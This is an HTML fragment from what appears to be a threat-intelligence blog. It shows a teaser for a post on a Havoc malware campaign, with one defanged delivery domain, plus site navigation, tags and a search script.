<time data-ts="1736985600" data-df="ll" > Jan 16, 2025 </time><h4 class="pt-0 my-2">Targeted Campaign Delivering Havoc</h4><div class="text-muted"><p>On January 15, 2025, a file named DH-Report76.pdf.lnk was uploaded to VirusTotal. The LNK file was likely being delivered to victims from army-mil[.]zapto.org. Parsing the LNK file, we can see t...</p></div></div></a></article></nav></aside><nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation"> <a href="/posts/Kivars/" class="btn btn-outline-primary" aria-label="Older" ><p>China-nexus Kivars Backdoor Uploaded from Taiwan</p></a><div class="btn btn-outline-primary disabled" aria-label="Newer"><p>-</p></div></nav><footer aria-label="Site Info" class=" d-flex flex-column justify-content-center text-muted flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3 " ><p>© <time>2025</time> <a href="https://github.com/dmpdump">dmpdump</a>. <span data-bs-toggle="tooltip" data-bs-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p><p>Using the <a data-bs-toggle="tooltip" data-bs-placement="top" title="v7.1.0" href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener" >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.</p></footer></div></div><div id="search-result-wrapper" class="d-flex justify-content-center d-none"><div class="col-11 content"><div id="search-hints"><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/malware/">malware</a> <a class="post-tag btn btn-outline-primary" href="/tags/cti/">cti</a> <a class="post-tag btn btn-outline-primary" href="/tags/apt/">apt</a> <a class="post-tag btn btn-outline-primary" href="/tags/chrome/">chrome</a> <a class="post-tag btn btn-outline-primary" href="/tags/re/">RE</a> <a class="post-tag btn btn-outline-primary" href="/tags/china/">china</a> <a class="post-tag btn btn-outline-primary" href="/tags/cn/">cn</a> <a class="post-tag btn btn-outline-primary" href="/tags/cti/">CTI</a> <a class="post-tag btn btn-outline-primary" href="/tags/dprk/">dprk</a> <a class="post-tag btn btn-outline-primary" href="/tags/golang/">golang</a></div></section></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><aside aria-label="Scroll to Top"> <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow"> <i class="fas fa-angle-up"></i> </button></aside></div><div id="mask"></div><aside id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-animation="true" data-bs-autohide="false" ><div class="toast-header"> <button type="button" class="btn-close ms-auto" data-bs-dismiss="toast" aria-label="Close" ></button></div><div class="toast-body text-center pt-0"><p class="px-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></aside><script src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.13/dayjs.min.js,npm/dayjs@1.11.13/locale/en.js,npm/dayjs@1.11.13/plugin/relativeTime.js,npm/dayjs@1.11.13/plugin/localizedFormat.js"></script> <script src="/assets/js/dist/post.min.js"></script> <script defer src="/app.min.js"></script> <script>SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<article class="px-1 px-sm-2 px-lg-4 px-xl-0"><header><h2><a href="{url}">{title}</a></h2><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div></header><p>{snippet}</p></article>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
